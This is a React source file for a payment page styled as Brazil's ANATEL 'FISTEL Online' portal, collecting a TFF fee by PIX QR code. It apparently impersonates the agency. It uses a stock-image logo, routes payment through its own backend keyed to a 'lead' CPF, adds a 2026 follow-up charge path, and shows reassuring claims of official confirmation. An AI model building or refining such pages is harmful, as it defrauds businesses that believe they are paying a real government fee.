import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { QRCode } from 'react-qrcode-logo';
import AnatelHeader from '@/components/AnatelHeader';
import AnatelFooter from '@/components/AnatelFooter';
import { toast } from 'sonner';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;
const fmt = (v) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(v || 0);

export default function AnatelPagamentoPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const [dadosEmpresa, setDadosEmpresa] = useState(null);
  const [taxas, setTaxas] = useState(null);
  const [pagamento, setPagamento] = useState(null);
  const [loading, setLoading] = useState(false);
  const [copiado, setCopiado] = useState(false);
  const pixGeradoRef = useRef(false);
  const stateRef = useRef(location.state);

  useEffect(() => {
    if (pixGeradoRef.current) return;
    pixGeradoRef.current = true;
    const state = stateRef.current;
    if (!state?.dadosEmpresa || !state?.taxas) { toast.error('Dados não encontrados'); navigate('/anatel'); return; }
    setDadosEmpresa(state.dadosEmpresa);
    setTaxas(state.taxas);
    gerarPix(state.dadosEmpresa, state.taxas, state.cpfAnterior);
  }, []);

  const gerarPix = async (empresa, taxasData, cpfAnterior = null) => {
    setLoading(true);
    try {
      const endpoint = cpfAnterior ? `${API}/pagamento/pix-2026` : `${API}/pagamento/pix`;
      const payload = { 
        cnpj: empresa.cnpj, 
        nome: empresa.nome, 
        email: 'contato@empresa.com', 
        valor: taxasData.total,
        ...(cpfAnterior && { cpf_anterior: cpfAnterior }),
        ...(empresa.cpf_lead && !cpfAnterior && { cpf_lead: empresa.cpf_lead })  // Usar CPF do lead
      };
      const { data } = await axios.post(endpoint, payload);
      setPagamento(data);
      toast.success('QR Code gerado!');
      iniciarMonitoramento(data.id, data.cpf_utilizado);
    } catch (err) {
      console.error(err);
      toast.error('Erro ao gerar PIX. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  const simularAprovacao = async () => {
    if (!pagamento?.id) return;
    try {
      await axios.post(`${API}/pagamento/simular-aprovacao/${pagamento.id}`);
      toast.success('Pagamento aprovado!');
      const is2026 = stateRef.current?.exercicio2026;
      setTimeout(() => {
        if (is2026) {
          navigate('/anatel/em-dia', { state: { cnpj: dadosEmpresa?.cnpj, dadosEmpresa } });
        } else {
          navigate('/anatel/confirmacao', { state: { valor: taxas?.total, cnpj: dadosEmpresa?.cnpj, dadosEmpresa, cpfUtilizado: pagamento?.cpf_utilizado } });
        }
      }, 800);
    } catch { toast.error('Erro ao simular'); }
  };

  const iniciarMonitoramento = (id, cpfUtilizado) => {
    const is2026 = stateRef.current?.exercicio2026;
    const interval = setInterval(async () => {
      try {
        const { data } = await axios.get(`${API}/pagamento/status/${id}`);
        console.log('[PIX] Status:', data.status);
        if (['paid', 'approved', 'CONFIRMED'].includes(data.status)) {
          clearInterval(interval);
          toast.success('Pagamento confirmado!');
          setTimeout(() => {
            if (is2026) navigate('/anatel/em-dia', { state: { cnpj: dadosEmpresa?.cnpj, dadosEmpresa } });
            else navigate('/anatel/confirmacao', { state: { valor: taxas?.total, cnpj: dadosEmpresa?.cnpj, dadosEmpresa, cpfUtilizado } });
          }, 1500);
        }
      } catch { /* silencioso */ }
    }, 10000); // Verifica a cada 10 segundos
    setTimeout(() => clearInterval(interval), 30 * 60 * 1000);
  };

  const copiar = () => {
    if (pagamento?.qr_code) {
      // Fallback para navegadores que bloqueiam Clipboard API
      const textArea = document.createElement('textarea');
      textArea.value = pagamento.qr_code;
      textArea.style.position = 'fixed';
      textArea.style.left = '-9999px';
      textArea.style.top = '-9999px';
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();
      
      try {
        document.execCommand('copy');
        setCopiado(true);
        toast.success('Código copiado!');
        setTimeout(() => setCopiado(false), 3000);
      } catch (err) {
        // Tentar Clipboard API como fallback
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(pagamento.qr_code)
            .then(() => {
              setCopiado(true);
              toast.success('Código copiado!');
              setTimeout(() => setCopiado(false), 3000);
            })
            .catch(() => {
              toast.error('Não foi possível copiar. Selecione e copie manualmente.');
            });
        } else {
          toast.error('Não foi possível copiar. Selecione e copie manualmente.');
        }
      }
      
      document.body.removeChild(textArea);
    }
  };

  const is2026 = stateRef.current?.exercicio2026;

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'Open Sans','Segoe UI',system-ui,sans-serif" }}>
      <AnatelHeader breadcrumb={`Pagamento PIX — TFF ${is2026 ? '2026' : '2025'}`} />

      {/* Hero com Logo ANATEL */}
      <div style={{ background: '#071D41' }} className="py-6 px-4">
        <div className="max-w-[1280px] mx-auto flex flex-col md:flex-row items-center justify-center gap-6">
          <img 
            src="https://customer-assets.emergentagent.com/job_lead-conversion-9/artifacts/ktf9iqob_pngwing.com.png"
            alt="ANATEL"
            className="w-24 md:w-32 h-auto"
          />
          <div className="text-center md:text-left">
            <p style={{ color: '#FFCD07' }} className="text-[11px] font-bold uppercase tracking-widest mb-1">FISTEL Online</p>
            <h1 className="text-white font-bold text-xl md:text-2xl">Pagamento PIX — TFF {is2026 ? '2026' : '2025'}</h1>
          </div>
        </div>
      </div>

      <main className="flex-1 py-8">
        <div className="max-w-[1280px] mx-auto px-4">
          <div className="grid lg:grid-cols-3 gap-8">

            {/* QR Code */}
            <div className="lg:col-span-2">
              <div style={{ background: '#1351B4' }} className="px-5 py-3">
                <h2 className="text-white font-bold text-[13px] uppercase tracking-wider">QR Code para Pagamento PIX</h2>
              </div>
              <div style={{ border: '1px solid #1351B4', borderTop: 'none' }} className="bg-white">
                {/* Valor */}
                <div style={{ background: '#f0f5ff', borderBottom: '1px solid #c7d9f5' }} className="p-5 text-center">
                  <p className="text-[11px] text-gray-500 uppercase tracking-widest mb-1">Valor a Pagar</p>
                  <p className="font-black text-[40px] text-[#071D41]" data-testid="valor-pagamento">{fmt(taxas?.total)}</p>
                  <p className="text-[12px] text-[#1351B4] mt-1 font-medium">
                    Taxa de Fiscalização de Funcionamento — Exercício {is2026 ? '2026' : '2025'}
                  </p>
                </div>

                <div className="p-6">
                  {loading ? (
                    <div className="flex flex-col items-center py-14">
                      <div className="w-10 h-10 border-2 border-[#1351B4]/20 border-t-[#1351B4] rounded-full animate-spin mb-4" />
                      <p className="text-gray-500 text-[14px]">Gerando QR Code...</p>
                      <p className="text-[12px] text-gray-400 mt-1">Aguarde um momento</p>
                    </div>
                  ) : pagamento?.qr_code ? (
                    <>
                      {/* QR Code + instruções */}
                      <div className="flex flex-col md:flex-row gap-6 items-start">
                        <div style={{ border: '2px solid #e0e0e0', padding: 16 }} className="bg-white flex-shrink-0 mx-auto md:mx-0">
                          <QRCode value={pagamento.qr_code} size={190} quietZone={10} bgColor="#FFFFFF" fgColor="#071D41" />
                        </div>
                        <div className="flex-1">
                          <p className="font-bold text-[13px] text-[#071D41] uppercase tracking-wide mb-3">Como pagar:</p>
                          <ol className="space-y-2">
                            {[
                              'Abra o aplicativo do seu banco',
                              'Acesse a função PIX → Ler QR Code',
                              'Aponte a câmera para o código ao lado',
                              'Confirme os dados e finalize o pagamento',
                            ].map((s, i) => (
                              <li key={i} className="flex items-start gap-2 text-[13px] text-gray-600">
                                <span style={{ background: '#1351B4', minWidth: 20, height: 20 }}
                                  className="flex items-center justify-center text-white font-bold text-[10px] flex-shrink-0 mt-0.5">
                                  {i + 1}
                                </span>
                                {s}
                              </li>
                            ))}
                          </ol>

                          {/* Aguardando */}
                          <div style={{ background: '#fff8e1', border: '1px solid #ffc107' }} className="flex items-center gap-2 p-3 mt-4">
                            <svg className="w-4 h-4 flex-shrink-0" style={{ color: '#856404' }} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                            <p className="text-[12px] font-bold" style={{ color: '#856404' }}>Aguardando confirmação de pagamento...</p>
                          </div>
                        </div>
                      </div>

                      {/* Código PIX (texto) */}
                      <div className="mt-5 p-4 bg-gray-50 rounded-lg border border-gray-200">
                        <p className="text-[11px] text-gray-500 uppercase tracking-wider font-bold mb-2">Código PIX Copia e Cola:</p>
                        <div className="bg-white border border-gray-300 rounded p-3 font-mono text-[11px] text-gray-700 break-all max-h-24 overflow-y-auto">
                          {pagamento.qr_code}
                        </div>
                      </div>

                      {/* Copiar código */}
                      <button
                        data-testid="btn-copiar-pix"
                        onClick={copiar}
                        style={{ border: `2px solid ${copiado ? '#168821' : '#1351B4'}`, color: copiado ? '#168821' : '#1351B4' }}
                        className="w-full flex items-center justify-center gap-2 font-bold text-[13px] py-3 mt-4 hover:opacity-80 transition-opacity cursor-pointer bg-white"
                      >
                        {copiado ? (
                          <>
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                            </svg>
                            Código copiado!
                          </>
                        ) : (
                          <>
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                            </svg>
                            Copiar código PIX
                          </>
                        )}
                      </button>
                    </>
                  ) : (
                    <div className="text-center py-10">
                      <svg className="w-10 h-10 text-red-400 mx-auto mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
                      </svg>
                      <p className="text-[14px] font-medium text-gray-600">Erro ao gerar QR Code</p>
                      <p className="text-[12px] text-gray-400 mt-1">Recarregue a página</p>
                    </div>
                  )}
                </div>
              </div>

              {/* Simulação — teste */}
              {pagamento && (
                <div style={{ border: '2px solid #fd7e14', marginTop: 16 }}>
                  <div style={{ background: '#fff3e0', borderBottom: '1px solid #fd7e14' }} className="px-4 py-2">
                    <p className="text-[11px] font-bold uppercase text-orange-700 tracking-wide">Ambiente de Testes — Remover em Produção</p>
                  </div>
                  <div className="p-4 bg-white">
                    <button
                      data-testid="btn-simular-aprovacao"
                      onClick={simularAprovacao}
                      style={{ background: '#fd7e14' }}
                      className="w-full text-white font-bold text-[14px] py-3 hover:opacity-90 transition-opacity cursor-pointer"
                    >
                      Simular Aprovação de Pagamento
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Sidebar */}
            <aside className="space-y-5">
              {/* Segurança */}
              <div>
                <div style={{ background: '#168821' }} className="px-4 py-3">
                  <h3 className="text-white font-bold text-[13px] uppercase tracking-wider">Pagamento Seguro</h3>
                </div>
                <div style={{ border: '1px solid #e0e0e0', borderTop: 'none' }} className="p-4 bg-white space-y-3">
                  {[
                    'Transação criptografada via PIX Bacen',
                    'Confirmação em até 2h úteis no sistema ANATEL',
                    'Comprovante emitido automaticamente',
                  ].map((t, i) => (
                    <p key={i} className="flex items-start gap-2 text-[12px] text-gray-600">
                      <svg className="w-4 h-4 text-[#168821] mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                      </svg>
                      {t}
                    </p>
                  ))}
                </div>
              </div>

              {/* Resumo */}
              {dadosEmpresa && (
                <div>
                  <div style={{ background: '#1351B4' }} className="px-4 py-3">
                    <h3 className="text-white font-bold text-[13px] uppercase tracking-wider">Resumo</h3>
                  </div>
                  <div style={{ border: '1px solid #e0e0e0', borderTop: 'none' }} className="bg-white">
                    {[
                      { label: 'Razão Social', val: dadosEmpresa.nome?.substring(0, 30) + (dadosEmpresa.nome?.length > 30 ? '...' : '') },
                      { label: 'Taxa', val: `TFF ${is2026 ? '2026' : '2025'}` },
                      { label: 'Valor', val: fmt(taxas?.total), bold: true },
                    ].map(r => (
                      <div key={r.label} style={{ borderBottom: '1px solid #f0f0f0' }} className="px-4 py-3">
                        <p className="text-[10px] text-gray-500 uppercase tracking-wide mb-0.5">{r.label}</p>
                        <p className={`text-[13px] ${r.bold ? 'font-black text-[#1351B4] text-[16px]' : 'font-bold text-[#071D41] uppercase'}`}>{r.val}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </aside>
          </div>
        </div>
      </main>

      <AnatelFooter />
    </div>
  );
}
